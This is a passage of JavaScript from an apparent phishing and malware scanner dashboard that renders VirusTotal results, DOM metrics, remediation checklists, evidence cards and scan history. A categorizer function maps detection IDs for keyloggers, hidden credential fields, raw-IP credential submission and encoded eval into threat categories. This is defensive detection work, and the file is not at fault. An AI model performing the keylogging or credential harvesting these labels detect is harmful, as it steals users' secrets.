    if (repEl) repEl.textContent = typeof vt.reputation === "number" ? vt.reputation : "N/A";
    if (tsEl) tsEl.textContent = vt.lastAnalysisDate || vt.analysisTimestamp || "N/A (Not supplied by feed)";

    if (statusPill) {
      if (mal > 0) {
        statusPill.className = "vt-status-pill flagged";
        statusPill.textContent = `${mal} MALICIOUS FLAG${mal === 1 ? "" : "S"}`;
      } else if (susp > 0) {
        statusPill.className = "vt-status-pill caution";
        statusPill.textContent = `${susp} SUSPICIOUS FLAG${susp === 1 ? "" : "S"}`;
      } else {
        statusPill.className = "vt-status-pill success";
        statusPill.textContent = "CLEAN CONSENSUS";
      }
    }

    if (statusNote) {
      statusNote.textContent = vt.message || `Reputation checked: ${mal} malicious, ${susp} suspicious, ${harmless} harmless out of ${totalEngines} engines.`;
      statusNote.style.color = mal > 0 ? "var(--color-malicious)" : susp > 0 ? "var(--color-suspicious)" : "var(--color-safe)";
    }

    if (consensusWrap && consensusBar && totalEngines > 0) {
      consensusWrap.style.display = "flex";
      consensusBar.innerHTML = "";
      const segs = [
        { cls: "vt-seg-malicious", count: mal, title: `Malicious: ${mal}` },
        { cls: "vt-seg-suspicious", count: susp, title: `Suspicious: ${susp}` },
        { cls: "vt-seg-harmless", count: harmless, title: `Harmless: ${harmless}` },
        { cls: "vt-seg-undetected", count: undetected, title: `Undetected: ${undetected}` }
      ];
      segs.forEach(seg => {
        if (seg.count > 0) {
          const div = document.createElement("div");
          div.className = seg.cls;
          div.style.width = `${((seg.count / totalEngines) * 100).toFixed(2)}%`;
          div.title = seg.title;
          consensusBar.appendChild(div);
        }
      });
      if (consensusSummary) {
        consensusSummary.textContent = `${mal} mal · ${susp} susp · ${harmless} harmless · ${undetected} undetected`;
      }
    } else if (consensusWrap) {
      consensusWrap.style.display = "none";
    }

    if (disclaimerText) {
      disclaimerText.textContent = mal === 0 && susp === 0
        ? "Zero VirusTotal detections indicates no vendor blacklist hits were recorded, but does not guarantee safety against newly deployed or unindexed threats."
        : "VirusTotal multi-vendor telemetry is weighed alongside static DOM inspection evidence.";
    }
  } else if (status === "not_found") {
    if (malEl) malEl.textContent = "0";
    if (suspEl) suspEl.textContent = "0";
    if (harmlessEl) harmlessEl.textContent = "N/A";
    if (undetectedEl) undetectedEl.textContent = "N/A";
    if (totalEl) totalEl.textContent = "0";
    if (repEl) repEl.textContent = "N/A";
    if (tsEl) tsEl.textContent = "Never Scanned";
    if (consensusWrap) consensusWrap.style.display = "none";
    if (statusPill) {
      statusPill.className = "vt-status-pill not_found";
      statusPill.textContent = "NOT INDEXED";
    }
    if (statusNote) {
      statusNote.textContent = vt?.message || "URL is not yet indexed in VirusTotal's global database (zero prior scans recorded).";
      statusNote.style.color = "var(--primary)";
    }
    if (disclaimerText) {
      disclaimerText.textContent = "Target URL has no prior analysis history in VirusTotal. Unindexed domains should not be assumed safe without manual verification.";
    }
  } else if (status === "not_applicable") {
    if (malEl) malEl.textContent = "N/A";
    if (suspEl) suspEl.textContent = "N/A";
    if (harmlessEl) harmlessEl.textContent = "N/A";
    if (undetectedEl) undetectedEl.textContent = "N/A";
    if (totalEl) totalEl.textContent = "N/A";
    if (repEl) repEl.textContent = "N/A";
    if (tsEl) tsEl.textContent = "N/A";
    if (consensusWrap) consensusWrap.style.display = "none";
    if (statusPill) {
      statusPill.className = "vt-status-pill not_applicable";
      statusPill.textContent = "NOT APPLICABLE";
    }
    if (statusNote) {
      statusNote.textContent = vt?.message || "VirusTotal reputation check not applicable for raw HTML input.";
      statusNote.style.color = "var(--text-muted)";
    }
    if (disclaimerText) {
      disclaimerText.textContent = "Raw HTML inspection evaluates submitted markup only. Submit a URL target to query global VirusTotal reputation feeds.";
    }
  } else {
    if (malEl) malEl.textContent = "Unavailable";
    if (suspEl) suspEl.textContent = "Unavailable";
    if (harmlessEl) harmlessEl.textContent = "Unavailable";
    if (undetectedEl) undetectedEl.textContent = "Unavailable";
    if (totalEl) totalEl.textContent = "N/A";
    if (repEl) repEl.textContent = "N/A";
    if (tsEl) tsEl.textContent = "Unavailable";
    if (consensusWrap) consensusWrap.style.display = "none";
    if (statusPill) {
      statusPill.className = "vt-status-pill unavailable";
      statusPill.textContent = "UNAVAILABLE";
    }
    if (statusNote) {
      statusNote.textContent = vt?.message || "Reputation check unavailable. No reputation conclusion can be drawn.";
      statusNote.style.color = "var(--text-secondary)";
    }
    if (disclaimerText) {
      disclaimerText.textContent = "VirusTotal intelligence is unavailable (missing API key, rate limit, or offline environment). Zero points added; verdict relies on static heuristics.";
    }
  }
}

// ================= STATIC DOM ANALYSIS MATRIX =================
function renderStaticDomMatrix(analysis) {
  const metrics = analysis?.metrics || {};

  const scriptsEl = document.getElementById("scripts");
  const extResEl = document.getElementById("domExternalResources");
  const formsEl = document.getElementById("domFormsCount");
  const hiddenEl = document.getElementById("hidden");
  const hiddenHintEl = document.getElementById("domHiddenCountHint");
  const iframesEl = document.getElementById("iframes");
  const iframeHintEl = document.getElementById("domIframeHint");
  const passEl = document.getElementById("domPasswordFields");
  const handlersEl = document.getElementById("domEventHandlers");
  const payloadEl = document.getElementById("domPayloadSize");
  const payloadBadge = document.getElementById("domPayloadSizeBadge");

  const totalScripts = typeof analysis?.totalScripts === "number" ? analysis.totalScripts : null;
  const totalIframes = typeof analysis?.totalIframes === "number" ? analysis.totalIframes : null;
  const hiddenDetected = typeof analysis?.hiddenElementsDetected === "boolean" ? analysis.hiddenElementsDetected : null;

  if (scriptsEl) scriptsEl.textContent = totalScripts !== null ? totalScripts : "N/A";
  if (extResEl) extResEl.textContent = typeof metrics.externalResourcesCount === "number" ? metrics.externalResourcesCount : "N/A";
  if (formsEl) formsEl.textContent = typeof metrics.formsCount === "number" ? metrics.formsCount : "N/A";

  if (hiddenEl) {
    if (hiddenDetected === null) {
      hiddenEl.textContent = "N/A";
      hiddenEl.style.color = "var(--text-muted)";
    } else {
      const totalHidden = typeof metrics.hiddenElementsCount === "number" ? metrics.hiddenElementsCount : null;
      const suspHidden = typeof metrics.suspiciousHiddenCount === "number" ? metrics.suspiciousHiddenCount : null;
      hiddenEl.textContent = hiddenDetected
        ? `Yes (${suspHidden ?? "Flagged"})`
        : (totalHidden !== null ? `${totalHidden} Benign` : "No");
      hiddenEl.style.color = hiddenDetected ? "var(--color-malicious)" : "var(--color-safe)";
      if (hiddenHintEl) {
        hiddenHintEl.textContent = hiddenDetected
          ? `${suspHidden ?? 1} suspicious concealed auth element(s)`
          : (totalHidden !== null ? `${totalHidden} standard UI hidden node(s), 0 threats` : "No concealed credential fields");
      }
    }
  }

  if (iframesEl) iframesEl.textContent = totalIframes !== null ? totalIframes : "N/A";
  if (iframeHintEl) {
    const suspIframes = typeof metrics.suspiciousIframesCount === "number" ? metrics.suspiciousIframesCount : null;
    iframeHintEl.textContent = suspIframes !== null && suspIframes > 0
      ? `${suspIframes} obscured/suspicious frame(s)`
      : "Evaluated for hidden/data src";
  }

  if (passEl) passEl.textContent = typeof metrics.passwordFieldsCount === "number" ? metrics.passwordFieldsCount : "N/A";
  if (handlersEl) handlersEl.textContent = typeof metrics.suspiciousEventHandlersCount === "number" ? metrics.suspiciousEventHandlersCount : "N/A";

  const payloadLen = typeof metrics.rawHtmlLength === "number" ? metrics.rawHtmlLength : null;
  const payloadLabel = payloadLen !== null ? `${payloadLen.toLocaleString()} chars` : "N/A";
  if (payloadEl) payloadEl.textContent = payloadLabel;
  if (payloadBadge) payloadBadge.textContent = `Payload: ${payloadLabel}`;

  // JS Patterns chip list
  const jsPatterns = Array.isArray(analysis?.suspiciousJSPatterns) ? analysis.suspiciousJSPatterns : [];
  const jsPatternsEl = document.getElementById("jsPatterns");
  if (jsPatternsEl) {
    jsPatternsEl.innerHTML = "";
    if (jsPatterns.length > 0) {
      jsPatterns.forEach(pattern => {
        const token = document.createElement("span");
        token.className = "code-token danger";
        token.textContent = String(pattern);
        jsPatternsEl.appendChild(token);
      });
    } else {
      jsPatternsEl.textContent = "None detected";
    }
  }

  // Matched Keywords chip list
  const matchedKeywords = Array.isArray(analysis?.matchedKeywords) ? analysis.matchedKeywords : [];
  const keywordsEl = document.getElementById("keywords");
  if (keywordsEl) {
    keywordsEl.innerHTML = "";
    if (matchedKeywords.length > 0) {
      matchedKeywords.forEach(kw => {
        const token = document.createElement("span");
        token.className = "keyword-token info-neutral";
        token.textContent = String(kw);
        keywordsEl.appendChild(token);
      });
    } else {
      keywordsEl.textContent = "None observed";
    }
  }
}

// ================= RENDER REMEDIATION PLAYBOOK =================
function renderRemediationPlaybook(data) {
  const banner = document.getElementById("remediationBanner");
  const summaryEl = document.getElementById("remediationSummary");
  const listEl = document.getElementById("remediationChecklist");
  const priorityTag = document.getElementById("remediationPriorityTag");

  if (!banner || !summaryEl || !listEl) return;

  const verdict = String(data.risk?.verdict || "SAFE").toUpperCase();
  const coverage = data.risk?.scanCoverage || "FULL";
  const findings = Array.isArray(data.risk?.evidenceFindings)
    ? data.risk.evidenceFindings
    : (Array.isArray(data.analysis?.findings) ? data.analysis.findings : []);
  const threatFindings = findings.filter(f => f.isThreat);

  banner.className = "remediation-callout " + verdict.toLowerCase();
  listEl.innerHTML = "";

  const steps = [];
  const pushStep = (msg) => {
    if (msg && !steps.includes(msg)) steps.push(msg);
  };

  if (verdict === "MALICIOUS") {
    if (priorityTag) priorityTag.textContent = "IMMEDIATE CONTAINMENT";
    summaryEl.textContent = "High-confidence threat indicators confirmed. Do not enter credentials and isolate target access immediately.";
    pushStep("Avoid entering credentials, API tokens, or payment details on this target.");
    threatFindings.forEach(f => pushStep(f.recommendedAction));
    if ((data.virusTotal?.malicious || 0) > 0) {
      pushStep("Block confirmed malicious destinations across corporate DNS filters, web proxies, and EDR policies.");
    }
  } else if (verdict === "SUSPICIOUS") {
    if (priorityTag) priorityTag.textContent = "ANALYST TRIAGE";
    summaryEl.textContent = "Anomalous DOM, script, or third-party indicators detected without confirmed widespread compromise. Verify before trusting.";
    threatFindings.forEach(f => pushStep(f.recommendedAction));
    if (coverage === "STATIC_ONLY" || data.virusTotal?.status === "not_found") {
      pushStep("Recheck suspicious targets with additional external threat intelligence and sandbox rendering before allowlisting.");
    }
  } else if (verdict === "INCONCLUSIVE") {
    if (priorityTag) priorityTag.textContent = "RE-INSPECTION ADVISED";
    summaryEl.textContent = "Target returned minimal or unparseable DOM content. Full static classification could not be established.";
    pushStep("Confirm target URL is reachable and serves valid HTML (WAF challenges or SPAs can return empty shells to non-browser clients).");
    pushStep("Capture the rendered DOM source from an isolated browser and resubmit via HTML Source Code mode.");
  } else {
    if (priorityTag) priorityTag.textContent = "ROUTINE MONITORING";
    summaryEl.textContent = "No verified threat signatures detected. Target conforms to standard static inspection baselines.";
    if (coverage === "STATIC_ONLY") {
      pushStep("Static inspection passed; reputation intelligence was unavailable — verify via additional threat intelligence if handling sensitive credentials.");
    } else {
      pushStep("Continue standard periodic monitoring; zero detections do not replace standard phishing hygiene and MFA enforcement.");
    }
  }

  steps.forEach((stepText, idx) => {
    const li = document.createElement("li");
    li.className = "remediation-step";
    const num = document.createElement("span");
    num.className = "remediation-step-num";
    num.textContent = `STEP ${idx + 1}`;
    const txt = document.createElement("span");
    txt.textContent = stepText;
    li.appendChild(num);
    li.appendChild(txt);
    listEl.appendChild(li);
  });
}

// ================= RENDER SCORE BREAKDOWN TABLE =================
function renderScoreBreakdown(scoredThreats, totalScore) {
  const tbody = document.getElementById("scoreBreakdownTableBody");
  const summaryEl = document.getElementById("scoreMathSummary");

  if (!tbody) return;
  tbody.innerHTML = "";

  if (summaryEl) {
    summaryEl.textContent = `Total Score: ${totalScore} / 100`;
  }

  if (!scoredThreats || scoredThreats.length === 0) {
    const tr = document.createElement("tr");
    tr.className = "score-row-clean";
    tr.innerHTML = `
      <td><span class="score-clean-id">CLEAN_BASELINE</span></td>
      <td>No threat indicators identified across static DOM and reputation inspection.</td>
      <td><span class="status-badge low">INFO</span></td>
      <td><span class="score-source-tag">BASELINE_AUDIT</span></td>
      <td>Standard authentic webpage structure</td>
      <td class="text-right"><strong class="points-clean">+0 pts</strong></td>
    `;
    tbody.appendChild(tr);
    return;
  }

  scoredThreats.forEach(item => {
    const tr = document.createElement("tr");
    const sev = String(item.severity || "MEDIUM").toUpperCase();
    const sevClass = sev === "CRITICAL" ? "high" : sev === "INFO" ? "low" : sev.toLowerCase();

    const tdId = document.createElement("td");
    const codeId = document.createElement("code");
    codeId.className = "score-threat-id";
    codeId.textContent = item.id || "THREAT_SIGNAL";
    tdId.appendChild(codeId);

    const tdName = document.createElement("td");
    tdName.textContent = item.name || "Security Threat Detection";

    const tdSev = document.createElement("td");
    const sevBadge = document.createElement("span");
    sevBadge.className = `status-badge ${sevClass}`;
    sevBadge.textContent = sev;
    tdSev.appendChild(sevBadge);

    const tdSrc = document.createElement("td");
    const srcTag = document.createElement("span");
    srcTag.className = "score-source-tag";
    srcTag.textContent = item.source || "ENGINE";
    tdSrc.appendChild(srcTag);

    const tdEv = document.createElement("td");
    const evCode = document.createElement("code");
    evCode.className = "score-threat-evidence";
    evCode.textContent = String(item.evidence || "").slice(0, 85);
    tdEv.appendChild(evCode);

    const tdPts = document.createElement("td");
    tdPts.className = "text-right";
    const strongPts = document.createElement("strong");
    strongPts.className = "points-threat";
    strongPts.textContent = `+${item.scoreContribution || 0} pts`;
    tdPts.appendChild(strongPts);

    tr.appendChild(tdId);
    tr.appendChild(tdName);
    tr.appendChild(tdSev);
    tr.appendChild(tdSrc);
    tr.appendChild(tdEv);
    tr.appendChild(tdPts);

    tbody.appendChild(tr);
  });
}

// ================= CATEGORIZE & RENDER DETECTION EVIDENCE =================
function categorizeEvidenceFinding(item) {
  const id = String(item?.id || "").toUpperCase();
  const name = String(item?.name || "").toUpperCase();

  if (id.includes("KEYLOGGER") || name.includes("KEYSTROKE")) {
    return "Keylogger indicators";
  }
  if (id.includes("EXTERNAL_CREDENTIAL_ACTION")) {
    return "Cross-domain form submissions";
  }
  if (
    id.includes("HIDDEN_CREDENTIAL") ||
    id.includes("HIDDEN_PASSWORD") ||
    id.includes("CREDENTIAL_SUBMISSION_RAW_IP") ||
    id.includes("INSECURE_PASSWORD") ||
    id.includes("SOCIAL_ENGINEERING")
  ) {
    return "Credential harvesting";
  }
  if (
    id.includes("EVAL_ENCODED") ||
    id.includes("FUNCTION_CONSTRUCTOR") ||
    id.includes("HEX_PACKED")
  ) {
    return "Obfuscated JavaScript";
  }
  if (
    id.includes("DYNAMIC_UNTRUSTED_SCRIPT") ||
    id.includes("IMMEDIATE_REDIRECT") ||
    id.includes("META_REFRESH") ||
    id.includes("INFO_SCRIPT")
  ) {
    return "Suspicious scripts";
  }
  if (id.includes("IFRAME")) {
    return "Suspicious iframes";
  }
  if (id.startsWith("VT_") || item?.source === "VIRUSTOTAL_REPUTATION") {
    return "VirusTotal intelligence";
  }
  return "Other detected anomalies";
}

function buildUnifiedEvidenceEntries(findings, scoredThreats) {
  const scoreMap = new Map();
  const sourceMap = new Map();
  (scoredThreats || []).forEach(st => {
    if (st && st.id) {
      scoreMap.set(st.id, st.scoreContribution || 0);
      if (st.source) sourceMap.set(st.id, st.source);
    }
  });

  const unified = [];
  const seenIds = new Set();

  (findings || []).forEach(f => {
    if (f?.id) seenIds.add(f.id);
    const pts = f?.isThreat && f?.id && scoreMap.has(f.id) ? scoreMap.get(f.id) : 0;
    const source = (f?.id && sourceMap.get(f.id)) || (String(f?.id || "").startsWith("VT_") ? "VIRUSTOTAL_REPUTATION" : "STATIC_HEURISTICS");
    unified.push({
      id: f?.id || "",
      name: f?.name || "Security Observation",
      category: categorizeEvidenceFinding(f),
      severity: String(f?.severity || "INFO").toUpperCase(),
      explanation: f?.explanation || f?.evidence || "",
      evidence: f?.evidence || "",
      whyItMatters: f?.whyItMatters || "",
      recommendedAction: f?.recommendedAction || "",
      isThreat: Boolean(f?.isThreat),
      source,
      scoreContribution: pts
    });
  });

  // Include VirusTotal or other scored threats not emitted inside static findings
  (scoredThreats || []).forEach(st => {
    if (!st || (st.id && seenIds.has(st.id))) return;
    unified.push({
      id: st.id || "",
      name: st.name || "Threat Signal",
      category: categorizeEvidenceFinding(st),
      severity: String(st.severity || "HIGH").toUpperCase(),
      explanation: st.evidence || st.name || "",
      evidence: st.evidence || "",
      whyItMatters: "Corroborated external reputation flag contributing to final risk classification.",
      recommendedAction: "Block or quarantine target destination and verify user exposure.",
      isThreat: true,
      source: st.source || "VIRUSTOTAL_REPUTATION",
      scoreContribution: st.scoreContribution || 0
    });
  });

  // Threats first, then informational observations
  unified.sort((a, b) => Number(b.isThreat) - Number(a.isThreat) || b.scoreContribution - a.scoreContribution);
  return unified;
}

function filterEvidenceCategory(category) {
  activeEvidenceCategory = category || "ALL";
  renderEvidenceCategoryTabs(cachedEvidenceEntries);
  renderFilteredEvidence();
  refreshIcons();
}

function renderEvidenceCategoryTabs(entries) {
  const tabsEl = document.getElementById("evidenceCategoryTabs");
  if (!tabsEl) return;
  tabsEl.innerHTML = "";

  if (!entries || entries.length === 0) return;

  const counts = new Map();
  entries.forEach(e => {
    counts.set(e.category, (counts.get(e.category) || 0) + 1);
  });

  const makeBtn = (label, key, count) => {
    const btn = document.createElement("button");
    btn.type = "button";
    btn.className = `evidence-cat-btn ${activeEvidenceCategory === key ? "active" : ""}`;
    btn.onclick = () => filterEvidenceCategory(key);

    const lblSpan = document.createElement("span");
    lblSpan.textContent = label;

    const cntSpan = document.createElement("span");
    cntSpan.className = "evidence-cat-count";
    cntSpan.textContent = count;

    btn.appendChild(lblSpan);
    btn.appendChild(cntSpan);
    tabsEl.appendChild(btn);
  };

  makeBtn("All Evidence", "ALL", entries.length);
  counts.forEach((count, category) => {
    makeBtn(category, category, count);
  });
}

function renderEvidenceFindings(findings, scoredThreats = []) {
  const threatBadge = document.getElementById("threatCountBadge");
  const infoBadge = document.getElementById("infoCountBadge");

  cachedEvidenceEntries = buildUnifiedEvidenceEntries(findings, scoredThreats);

  const threatCount = cachedEvidenceEntries.filter(f => f.isThreat).length;
  const infoCount = cachedEvidenceEntries.filter(f => !f.isThreat).length;

  if (threatBadge) threatBadge.textContent = `${threatCount} Threat${threatCount === 1 ? "" : "s"}`;
  if (infoBadge) infoBadge.textContent = `${infoCount} Informational`;

  renderEvidenceCategoryTabs(cachedEvidenceEntries);
  renderFilteredEvidence();
}

function renderFilteredEvidence() {
  const tbody = document.getElementById("evidenceTableBody");
  const container = document.getElementById("findingsContainer");
  if (!container) return;

  const visible = activeEvidenceCategory === "ALL"
    ? cachedEvidenceEntries
    : cachedEvidenceEntries.filter(e => e.category === activeEvidenceCategory);

  if (tbody) {
    tbody.innerHTML = "";
    if (visible.length === 0) {
      const tr = document.createElement("tr");
      const td = document.createElement("td");
      td.colSpan = 6;
      td.className = "table-date-cell";
      td.textContent = "No analyzer findings or threat anomalies recorded.";
      tr.appendChild(td);
      tbody.appendChild(tr);
    } else {
      visible.forEach(item => {
        const tr = document.createElement("tr");
        const sevClass = item.severity === "CRITICAL" ? "high" : item.severity === "INFO" ? "low" : item.severity.toLowerCase();

        const tdName = document.createElement("td");
        tdName.textContent = item.name;

        const tdCat = document.createElement("td");
        const catPill = document.createElement("span");
        catPill.className = "evidence-cat-pill";
        catPill.textContent = item.category;
        tdCat.appendChild(catPill);

        const tdDesc = document.createElement("td");
        tdDesc.className = "evidence-desc-cell";
        tdDesc.textContent = item.explanation || item.evidence || "--";

        const tdSev = document.createElement("td");
        const sevBadge = document.createElement("span");
        sevBadge.className = `status-badge ${sevClass}`;
        sevBadge.textContent = item.severity;
        tdSev.appendChild(sevBadge);

        const tdSrc = document.createElement("td");
        const srcTag = document.createElement("span");
        srcTag.className = "score-source-tag";
        srcTag.textContent = item.source;
        tdSrc.appendChild(srcTag);

        const tdPts = document.createElement("td");
        tdPts.className = "text-right";
        const ptsEl = document.createElement("strong");
        ptsEl.className = item.scoreContribution > 0 ? "points-threat" : "points-clean";
        ptsEl.textContent = `+${item.scoreContribution} pts`;
        tdPts.appendChild(ptsEl);

        tr.appendChild(tdName);
        tr.appendChild(tdCat);
        tr.appendChild(tdDesc);
        tr.appendChild(tdSev);
        tr.appendChild(tdSrc);
        tr.appendChild(tdPts);
        tbody.appendChild(tr);
      });
    }
  }

  container.innerHTML = "";
  if (visible.length === 0) {
    container.innerHTML = `
      <div class="findings-empty-note">
        <i data-lucide="shield-check" class="icon-18"></i>
        <span>Clean security baseline: No threat findings or anomalous signatures recorded.</span>
      </div>
    `;
    return;
  }

  visible.forEach(f => {
    const card = document.createElement("div");
    card.className = `evidence-card ${f.isThreat ? "is-threat" : "is-info"} sev-${f.severity.toLowerCase()}`;

    const header = document.createElement("div");
    header.className = "evidence-card-header";

    const titleGroup = document.createElement("div");
    titleGroup.className = "evidence-title-group";

    const title = document.createElement("h5");
    title.className = "evidence-name";
    title.textContent = f.name;

    const catBadge = document.createElement("span");
    catBadge.className = "evidence-cat-pill";
    catBadge.textContent = f.category;

    const typeChip = document.createElement("span");
    typeChip.className = `evidence-type-chip ${f.isThreat ? "threat" : "info"}`;
    typeChip.textContent = f.isThreat ? "Threat Indicator" : "Informational";

    titleGroup.appendChild(title);
    titleGroup.appendChild(catBadge);
    titleGroup.appendChild(typeChip);

    const headerBadges = document.createElement("div");
    headerBadges.className = "evidence-header-badges";

    const scoreBadge = document.createElement("span");
    scoreBadge.className = `evidence-score-badge ${f.scoreContribution > 0 ? "scored" : "zero"}`;
    scoreBadge.textContent = `+${f.scoreContribution} pts`;

    const sevBadge = document.createElement("span");
    sevBadge.className = `evidence-sev-badge sev-${f.severity.toLowerCase()}`;
    sevBadge.textContent = f.severity;

    headerBadges.appendChild(scoreBadge);
    headerBadges.appendChild(sevBadge);

    header.appendChild(titleGroup);
    header.appendChild(headerBadges);
    card.appendChild(header);

    const body = document.createElement("div");
    body.className = "evidence-card-body";

    if (f.explanation) body.appendChild(createEvidenceRow("Description:", f.explanation, "text"));
    if (f.evidence) body.appendChild(createEvidenceRow("Observed Evidence:", f.evidence, "code"));
    if (f.whyItMatters) body.appendChild(createEvidenceRow("Why It Matters:", f.whyItMatters, "text"));
    if (f.recommendedAction) body.appendChild(createEvidenceRow("Recommended Action:", f.recommendedAction, "action"));

    card.appendChild(body);
    container.appendChild(card);
  });
}

function createEvidenceRow(label, content, type) {
  const row = document.createElement("div");
  row.className = "evidence-row";

  const lbl = document.createElement("span");
  lbl.className = "evidence-row-label";
  lbl.textContent = label;

  let val;
  if (type === "code") {
    val = document.createElement("div");
    val.className = "evidence-code-wrap";

    const codeEl = document.createElement("code");
    codeEl.className = "evidence-row-code";
    codeEl.textContent = content;

    const copyBtn = document.createElement("button");
    copyBtn.type = "button";
    copyBtn.className = "copy-evidence-btn";
    copyBtn.innerHTML = `<i data-lucide="copy" class="icon-12"></i><span>Copy</span>`;
    copyBtn.onclick = () => {
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(String(content)).then(() => {
          copyBtn.innerHTML = `<i data-lucide="check" class="icon-12"></i><span>Copied</span>`;
          refreshIcons();
          setTimeout(() => {
            copyBtn.innerHTML = `<i data-lucide="copy" class="icon-12"></i><span>Copy</span>`;
            refreshIcons();
          }, 1600);
        });
      }
    };

    val.appendChild(codeEl);
    val.appendChild(copyBtn);
  } else if (type === "action") {
    val = document.createElement("span");
    val.className = "evidence-row-action";
    val.textContent = content;
  } else {
    val = document.createElement("span");
    val.className = "evidence-row-text";
    val.textContent = content;
  }

  row.appendChild(lbl);
  row.appendChild(val);
  return row;
}

function highlightSeverityViolations(data) {
  const rowScripts = document.getElementById("param-scripts");
  const rowHidden = document.getElementById("param-hidden");
  const rowIframes = document.getElementById("param-iframes");
  const rowKeywords = document.getElementById("param-keywords");
  const rowVt = document.getElementById("param-vt");

  if (rowScripts) {
    rowScripts.classList.toggle("param-violation", (data.analysis?.suspiciousJSPatterns?.length || 0) > 0);
  }
  if (rowHidden) {
    rowHidden.classList.toggle("param-violation", !!data.analysis?.hiddenElementsDetected);
  }
  if (rowIframes) {
    rowIframes.classList.toggle("param-violation", (data.analysis?.metrics?.suspiciousIframesCount || 0) > 0);
  }
  if (rowKeywords) {
    rowKeywords.classList.toggle("param-violation", (data.analysis?.metrics?.phishingThreatsCount || 0) > 0);
  }
  if (rowVt) {
    rowVt.classList.toggle("param-violation", (data.virusTotal?.malicious || 0) > 0);
  }
}

// ================= CLEAR FORM =================
function clearForm() {
  const inputEl = document.getElementById("inputData");
  const resultDiv = document.getElementById("result");
  const downloadBtn = document.getElementById("downloadBtn");

  if (inputEl) inputEl.value = "";
  if (resultDiv) resultDiv.style.display = "none";
  if (downloadBtn) downloadBtn.style.display = "none";
  stopScanAnimation();

  ["param-scripts", "param-hidden", "param-iframes", "param-keywords", "param-vt"].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.classList.remove("param-violation");
  });

  if (lenisInstance) lenisInstance.resize();
}

// ================= SESSION HISTORY STORAGE =================
function saveToHistory(target, severity, fullData = null, rawInput = "", timestamp = "") {
  const history = JSON.parse(sessionStorage.getItem("scanHistory")) || [];

  const verdict = fullData?.risk?.verdict || severity;
  const safeRawInput = (typeof rawInput === "string" && rawInput.length <= 32768) ? rawInput : "";

  const record = {
    target: target,
    severity: severity,
    verdict: verdict,
    time: timestamp || new Date().toLocaleString(),
    rawInput: safeRawInput,
    fullData: fullData ? {
      risk: fullData.risk,
      analysis: fullData.analysis,
      virusTotal: fullData.virusTotal
    } : null
  };

  history.unshift(record);
  const trimmed = history.slice(0, 20);
  try {
    sessionStorage.setItem("scanHistory", JSON.stringify(trimmed));
  } catch (_) {
    // Graceful fallback if rawInput pushes sessionStorage close to quota
    record.rawInput = "";
    sessionStorage.setItem("scanHistory", JSON.stringify(trimmed.slice(0, 10)));
  }
}

async function clearScanHistory() {
  const confirmed = await showSocConfirm({
    title: "Clear Audit Log?",
    text: "This will permanently clear all recorded scan results from your current browser session.",
    confirmText: "Clear History"
  });

  if (confirmed) {
    sessionStorage.removeItem("scanHistory");
    refreshAllDashboardData();
    showSocAlert({
      icon: "success",
      title: "Audit Log Cleared",
      text: "Session scan history has been reset."
    });
  }
}

// ================= DASHBOARD & HISTORY REFRESH =================
function refreshAllDashboardData() {
  const history = JSON.parse(sessionStorage.getItem("scanHistory")) || [];

  const historyBadge = document.getElementById("historyBadgeCount");
  if (historyBadge) historyBadge.innerText = history.length;

  const total = history.length;
  const safeCount = history.filter(h => {
    const v = (h.verdict || h.severity || "").toUpperCase();
    return v === "SAFE" || v === "LOW";
  }).length;

  const suspiciousCount = history.filter(h => {
    const v = (h.verdict || h.severity || "").toUpperCase();
    return v === "SUSPICIOUS" || v === "MEDIUM";
  }).length;

  const maliciousCount = history.filter(h => {
    const v = (h.verdict || h.severity || "").toUpperCase();
    return v === "MALICIOUS" || v === "HIGH";
  }).length;

  const statTotal = document.getElementById("statTotalScans");
  const statSafe = document.getElementById("statSafeScans");
  const statSuspicious = document.getElementById("statSuspiciousScans");
  const statMalicious = document.getElementById("statMaliciousScans");

  if (statTotal) statTotal.innerText = total;
  if (statSafe) statSafe.innerText = safeCount;
  if (statSuspicious) statSuspicious.innerText = suspiciousCount;
  if (statMalicious) statMalicious.innerText = maliciousCount;

  // Real percentage shares
  const safeShare = document.getElementById("statSafeShare");
  const suspShare = document.getElementById("statSuspiciousShare");
  const malShare = document.getElementById("statMaliciousShare");
  if (safeShare) safeShare.innerText = total > 0 ? `${Math.round((safeCount / total) * 100)}%` : "0%";
  if (suspShare) suspShare.innerText = total > 0 ? `${Math.round((suspiciousCount / total) * 100)}%` : "0%";
  if (malShare) malShare.innerText = total > 0 ? `${Math.round((maliciousCount / total) * 100)}%` : "0%";

  // Update Threat Analytics Donut Chart, Risk Score Timeline Chart & Threat Activity Timeline
  updateThreatAnalyticsChart(safeCount, suspiciousCount, maliciousCount, total);
  updateActivityTimelineChart(history);
  fetchSocTimelineEvents();

  // Update Recent & Full History Tables
  renderDashboardRecentTable(history.slice(0, 5));
  renderFullHistoryTable();
  renderHistory();
  refreshIcons();
}

// ================= THREAT ANALYTICS DONUT CHART =================
function updateThreatAnalyticsChart(safeCount, suspiciousCount, maliciousCount, total) {
  const emptyState = document.getElementById("threatChartEmpty");
  const chartWrapper = document.getElementById("threatChartWrapper");
  const canvas = document.getElementById("threatChartCanvas");
  const fallbackContainer = document.getElementById("nativeFallbackChart");
  const donutTotalNum = document.getElementById("donutTotalNum");

  const safeLegend = document.getElementById("legendSafeVal");
  const suspLegend = document.getElementById("legendSuspiciousVal");
  const malLegend = document.getElementById("legendMaliciousVal");

  if (donutTotalNum) donutTotalNum.innerText = total;

  if (total === 0) {
    if (emptyState) emptyState.style.display = "flex";
    if (chartWrapper) chartWrapper.style.display = "none";
    if (safeLegend) safeLegend.innerText = "0 (0%)";
    if (suspLegend) suspLegend.innerText = "0 (0%)";
    if (malLegend) malLegend.innerText = "0 (0%)";
    return;
  }

  if (emptyState) emptyState.style.display = "none";
  if (chartWrapper) chartWrapper.style.display = "flex";

  const safePct = Math.round((safeCount / total) * 100);
  const suspPct = Math.round((suspiciousCount / total) * 100);
  const malPct = Math.round((maliciousCount / total) * 100);

  if (safeLegend) safeLegend.innerText = `${safeCount} (${safePct}%)`;
  if (suspLegend) suspLegend.innerText = `${suspiciousCount} (${suspPct}%)`;
  if (malLegend) malLegend.innerText = `${maliciousCount} (${malPct}%)`;

  if (typeof Chart !== "undefined" && canvas) {
    registerDonutTooltipPositioner();
    canvas.style.display = "block";
    if (fallbackContainer) fallbackContainer.style.display = "none";

    if (threatChartInstance) {
      threatChartInstance.data.datasets[0].data = [safeCount, suspiciousCount, maliciousCount];
      threatChartInstance.update();
    } else {
      const ctx = canvas.getContext("2d");
